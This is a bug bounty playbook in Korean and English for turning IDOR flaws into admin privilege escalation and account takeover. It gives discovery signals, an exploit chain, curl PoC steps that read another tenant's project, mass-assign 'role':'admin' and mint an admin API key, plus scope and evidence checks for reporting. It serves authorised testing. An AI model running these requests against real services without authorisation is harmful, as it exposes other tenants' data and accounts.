# Scenario: IDOR → Account Takeover / Admin Privesc

> 최빈도 bugcrowd/h1 P2-P1 케이스. 수평(horizontal) IDOR가 인증/인가 체계의 구조적
> 결함과 결합하면 수직(vertical) privesc 또는 ATO로 escalate 가능.

## 1. Threat Model
- **타겟**: REST/GraphQL API with tenant-scoped resources (user_id, org_id, project_id)
- **공격자**: 저권한 인증 사용자 (다른 테넌트 멤버)
- **Impact**: 타 테넌트 데이터 read/write → admin 권한 위조 → 전체 ATO
- **VRT 매핑**: `broken_access_control.idor` (P2-P3) / `broken_authentication.privilege_escalation` (P1)
- **CVSS anchor**: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS 9.6 — scope changed)

## 2. Discovery Signals
- URL/body/header에 순차적(numeric) 또는 예측 가능(UUIDv1/timestamp) 리소스 식별자
- `X-Account-ID`, `X-Tenant-ID`, `X-Workspace` 같은 client-controlled 헤더
- Response에 다른 테넌트 리소스 링크가 섞여 나옴 (cross-tenant leakage)
- `role=admin` 플래그가 request body에 포함되는 PUT/PATCH 엔드포인트
- GraphQL mutation에서 `userId` 인자가 authorization 체크 없이 허용

## 3. Exploit Chain
```
A. 본인 계정으로 리소스 나열 → ID 패턴 파악
B. 다른 테넌트 ID 추측/열거 → GET/PUT 시도 → 403 vs 200 분기
C. "role" / "is_admin" / "plan" 같은 privilege 필드 mass-assignment 시도
D. Admin action endpoint (/billing, /users/invite, /api-keys) 호출
E. API key 발급 또는 본인 계정 admin 승격 → persistent 접근 확보
```

**Pivot 포인트**: C단계에서 mass-assignment 성공 시 → D 건너뛰고 E로 직행 가능

## 4. PoC Template

```bash
# Step A: 본인 리소스
curl -s -H "Authorization: Bearer $LOW_TOKEN" \
  https://api.target.example/v1/projects | jq '.data[].id' | head

# Step B: 다른 테넌트 리소스 열람
curl -s -H "Authorization: Bearer $LOW_TOKEN" \
  "https://api.target.example/v1/projects/${VICTIM_PROJECT_ID}" \
  -o victim_read.json
jq '.tenant_id, .owner_email' victim_read.json

# Step C: 권한 필드 mass-assignment
curl -s -X PATCH -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_owner":true}' \
  "https://api.target.example/v1/users/self" \
  -o privesc_resp.json

# Step D: Admin-only 엔드포인트 호출로 확정
curl -s -X POST -H "Authorization: Bearer $LOW_TOKEN" \
  https://api.target.example/v1/admin/api-keys \
  -d '{"name":"poc-key","scopes":["admin:*"]}' \
  -o admin_key.json
```

## 5. Evidence Tier
- **E1** (최상): 두 개의 분리된 테스트 계정 — 공격자 token으로 victim 리소스 수정 + victim token으로 수정 결과 확인 (screenshot + response)
- **E2**: 공격자 token만으로 victim 리소스의 `owner_email` 같은 식별 필드 read, 하지만 cross-account write confirmation 없음
- **E3**: 403이 아닌 200 응답만 캡처, 실제 데이터 확인 불가
- **E4**: 이론적 추론 (source review only)

## 6. Gate 1 / Gate 2 체크
- [ ] **Feature check**: 프로그램이 "multi-tenant 조회는 의도된 기능"이라고 명시? → KILL
- [ ] **Scope check**: `/admin/*` 엔드포인트가 프로그램 "In-Scope"에 포함?
- [ ] **Duplicate check**: 같은 프로그램 hacktivity에 동일 endpoint IDOR 기제보?
- [ ] **Prereq check**: "저권한 사용자 + 동일 플랜" 조건이 현실적? (enterprise-only면 severity 낮춤)
- [ ] **Live proof check**: 두 계정 간 cross-write 증명 있어야 E1. 없으면 STRENGTHEN
- [ ] **Gate 2 mock check**: PoC가 실제 프로덕션 호스트? staging bypass 사고 방지

## 7. Variants / Chains
- **BOLA** (Broken Object Level Auth, OWASP API #1) — 이 시나리오의 상위 카테고리
- **BFLA** (Broken Function Level Auth) — endpoint 자체에 대한 role 체크 누락
- **Mass assignment** → `is_admin`/`role` 같은 privilege 필드를 request body에서 받음
- **Cross-tenant search** — `GET /search?q=...`에서 tenant 필터 누락
- **WebSocket IDOR** — REST는 보호되지만 WS 채널은 tenant 체크 누락
- **File upload IDOR** — presigned upload URL이 tenant에 bind 안됨

## 8. References
- OWASP API Security Top 10 2023 — API1 Broken Object Level Authorization
- PortSwigger Academy — https://portswigger.net/web-security/access-control
- HackerOne 공개 사례: Shopify, GitLab, Uber 다수 (hacktivity 검색: "IDOR")
- Intigriti 2024 Top IDOR writeups — https://blog.intigriti.com/
- Bugcrowd VRT — `broken_access_control.idor` 계층 참조

## 관련 Terminator 파이프라인
- Phase 1 analyst: `vulnerability_candidates.md`에 IDOR 의심 endpoint 목록
- Phase 1.5 workflow-auditor: 테넌트 간 workflow transition 검사
- Phase 2 exploiter: 두 계정 test_accounts.json (주의: 탈퇴 경로 사전 확인 — feedback_test_account_lessons.md)
